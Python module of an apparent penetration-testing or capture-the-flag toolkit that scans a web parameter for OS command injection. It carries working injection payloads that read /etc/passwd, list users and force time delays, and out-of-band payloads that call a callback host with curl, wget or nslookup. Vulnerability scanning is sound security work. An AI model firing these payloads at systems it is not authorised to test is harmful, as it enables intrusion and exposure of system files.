"""Command Injection scanner module."""

import asyncio
import re
import time
from typing import Optional, Callable

from ..base import AttackModule
from ...core.context import AttackContext
from ...core.http_client import Response
from ...utils.logger import log_info, log_warning, log_vulnerable, create_progress
from ...utils.flag_extractor import FlagExtractor


# Default command injection payloads
DEFAULT_CMDI_PAYLOADS = [
    # Basic injection
    "; id",
    "| id",
    "|| id",
    "&& id",
    "& id",
    "`id`",
    "$(id)",
    # Newline injection
    "\nid",
    "\r\nid",
    # With comments
    "; id #",
    "| id #",
    # Windows
    "& whoami",
    "| whoami",
    "|| whoami",
    # Blind injection (sleep/ping based)
    "; sleep 5",
    "| sleep 5",
    "|| sleep 5",
    "&& sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    # Windows blind
    "& ping -n 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
]

# Time-based payloads with configurable delay
TIME_BASED_PAYLOADS = [
    "; sleep {delay}",
    "| sleep {delay}",
    "|| sleep {delay}",
    "&& sleep {delay}",
    "$(sleep {delay})",
    "`sleep {delay}`",
    "& ping -n {delay} 127.0.0.1",  # Windows
    "| ping -c {delay} 127.0.0.1",  # Linux
]

# Patterns indicating command execution
COMMAND_OUTPUT_PATTERNS = [
    r'uid=\d+\(\w+\)\s+gid=\d+',  # id command output (Linux)
    r'[a-zA-Z]:\\Users\\',  # Windows path
    r'root:x:0:0:',  # /etc/passwd content
    r'Linux \w+ \d+\.\d+',  # uname output
    r'COMPUTERNAME=',  # Windows env
    r'USER=\w+',  # Unix env
    r'drwx',  # ls -la output
    r'total \d+',  # ls output
]


class CmdiScanner(AttackModule):
    """Command Injection vulnerability scanner."""

    @property
    def name(self) -> str:
        return "Command Injection Scanner"

    @property
    def description(self) -> str:
        return "Scans for OS Command Injection vulnerabilities"

    def __init__(self, ctx: AttackContext, os_type: str = "linux"):
        """
        Initialize Command Injection scanner.

        Args:
            ctx: Attack context
            os_type: Target OS type (linux, windows, auto)
        """
        super().__init__(ctx)
        self.os_type = os_type
        self.flag_extractor = FlagExtractor()
        self.vulnerable_payloads: list[dict] = []
        self.detected_os: Optional[str] = None

    async def scan(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        time_based: bool = True
    ) -> list[dict]:
        """
        Scan target for Command Injection vulnerabilities.

        Args:
            payloads: Custom payloads (if None, uses built-in)
            on_finding: Callback function when vulnerability found
            time_based: Include time-based detection

        Returns:
            List of findings
        """
        if payloads is None:
            payloads = self._get_default_payloads(time_based)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} CMDi payloads against {self.ctx.target_url}")
            log_info(f"Target parameter: {self.ctx.inject_param}")
            log_info(f"Target OS: {self.os_type}")

        # Setup baseline
        await self.setup()

        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for Command Injection...", total=len(payloads))

            semaphore = asyncio.Semaphore(self.ctx.threads)

            async def test_with_semaphore(payload: str):
                async with semaphore:
                    return await self._test_single_payload(payload)

            tasks = [test_with_semaphore(p) for p in payloads]

            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

                    if self.ctx.verbose:
                        log_vulnerable(
                            self.ctx.target_url,
                            self.ctx.inject_param or "unknown",
                            result["payload"]
                        )

        await self.cleanup()

        self.results = findings
        return findings

    def scan_sync(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        time_based: bool = True
    ) -> list[dict]:
        """Synchronous scan."""
        if payloads is None:
            payloads = self._get_default_payloads(time_based)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} CMDi payloads")

        self.setup_sync()
        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for Command Injection...", total=len(payloads))

            for payload in payloads:
                result = self._test_single_payload_sync(payload)
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

        self.cleanup_sync()
        self.results = findings
        return findings

    async def _test_single_payload(self, payload: str) -> Optional[dict]:
        """Test a single command injection payload asynchronously."""
        try:
            start_time = time.time()
            response = await self.client.request_with_payload(payload)
            elapsed = time.time() - start_time

            # Check for flags
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            # Check for command execution evidence
            is_vulnerable, evidence, detection_method = self._check_vulnerability(
                response, payload, elapsed
            )

            if is_vulnerable:
                finding = {
                    "type": f"Command Injection ({detection_method})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(detection_method),
                    "detection_method": detection_method,
                    "os_type": self.detected_os or self.os_type,
                    "flags_found": flags,
                    "response_time": elapsed,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing CMDi payload: {e}")

        return None

    def _test_single_payload_sync(self, payload: str) -> Optional[dict]:
        """Test a single payload synchronously."""
        try:
            start_time = time.time()
            response = self.client.request_with_payload_sync(payload)
            elapsed = time.time() - start_time

            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            is_vulnerable, evidence, detection_method = self._check_vulnerability(
                response, payload, elapsed
            )

            if is_vulnerable:
                finding = {
                    "type": f"Command Injection ({detection_method})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(detection_method),
                    "detection_method": detection_method,
                    "os_type": self.detected_os or self.os_type,
                    "flags_found": flags,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing CMDi payload: {e}")

        return None

    def _check_vulnerability(
        self, response: Response, payload: str, elapsed: float
    ) -> tuple[bool, str, str]:
        """Check if command injection was successful."""
        text = response.text

        # Check for command output patterns
        for pattern in COMMAND_OUTPUT_PATTERNS:
            match = re.search(pattern, text)
            if match:
                # Detect OS from output
                if 'uid=' in text or 'root:' in text:
                    self.detected_os = "linux"
                elif 'COMPUTERNAME=' in text or ':\\Users\\' in text:
                    self.detected_os = "windows"

                return True, f"Command output detected: {match.group()[:50]}", "output_based"

        # Check for time-based detection
        if "sleep" in payload.lower() or "ping" in payload.lower():
            expected_delay = self._extract_delay(payload)
            if elapsed >= expected_delay * 0.8:  # 80% threshold
                return True, f"Response delayed by {elapsed:.2f}s (expected {expected_delay}s)", "time_based"

        # Check for error-based detection
        error_patterns = [
            r'sh: .+: command not found',
            r'bash: .+: command not found',
            r"'\\w+' is not recognized",  # Windows
            r'syntax error',
            r'unexpected token',
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True, f"Command error in response", "error_based"

        return False, "", ""

    def _extract_delay(self, payload: str) -> float:
        """Extract delay value from time-based payload."""
        # Try to find sleep/ping delay
        match = re.search(r'sleep\s+(\d+)', payload)
        if match:
            return float(match.group(1))

        match = re.search(r'ping\s+-[nc]\s+(\d+)', payload)
        if match:
            return float(match.group(1))

        return self.ctx.time_threshold

    def _calculate_confidence(self, detection_method: str) -> str:
        """Calculate confidence level."""
        confidence_map = {
            "output_based": "high",
            "time_based": "medium",
            "error_based": "low",
        }
        return confidence_map.get(detection_method, "low")

    def _get_default_payloads(self, time_based: bool = True) -> list[str]:
        """Get default command injection payloads."""
        payloads = DEFAULT_CMDI_PAYLOADS.copy()

        # Add OS-specific payloads
        if self.os_type == "linux":
            payloads.extend([
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "$(cat /etc/passwd)",
                "; uname -a",
                "| ls -la",
            ])
        elif self.os_type == "windows":
            payloads.extend([
                "& type C:\\Windows\\win.ini",
                "| type C:\\Windows\\win.ini",
                "& dir",
                "| net user",
            ])

        # Add time-based payloads
        if time_based:
            delay = int(self.ctx.time_threshold)
            for template in TIME_BASED_PAYLOADS:
                payloads.append(template.format(delay=delay))

        return list(set(payloads))

    def get_blind_payloads(self, callback_url: str) -> list[str]:
        """Get out-of-band payloads for blind command injection."""
        return [
            f"; curl {callback_url}",
            f"| curl {callback_url}",
            f"$(curl {callback_url})",
            f"`curl {callback_url}`",
            f"; wget {callback_url}",
            f"| wget {callback_url}",
            f"& nslookup {callback_url}",  # DNS exfiltration
            f"| nslookup {callback_url}",
        ]
